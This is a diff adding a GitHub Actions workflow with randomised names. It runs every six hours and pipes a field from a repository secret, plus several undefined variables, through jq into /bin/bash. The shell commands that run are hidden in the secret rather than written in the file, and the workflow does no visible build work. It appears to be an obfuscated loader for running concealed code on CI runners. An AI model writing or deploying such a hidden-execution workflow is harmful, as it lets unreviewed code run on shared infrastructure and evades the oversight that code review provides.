@@ -1,0 +1,25 @@
+name: haizhinuo7613
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haizhinuo7613
+        env:
+          npdf4: ${{ secrets.npdf4 }}
+        run: |
+          echo $npdf4 | jq -r .llvjo49533 | /bin/bash
+          echo $cro563 | jq -r .mvis5376 | /bin/bash
+          echo $cfo00 | jq -r .hail5 | /bin/bash
+          echo $ocugx61 | jq -r .ibwr6156 | /bin/bash
+          echo $epcji9467 | jq -r .t47 | /bin/bash
+          echo $karvh81 | jq -r .judfr7 | /bin/bash
+          echo $kk84 | jq -r .h4 | /bin/bash
+
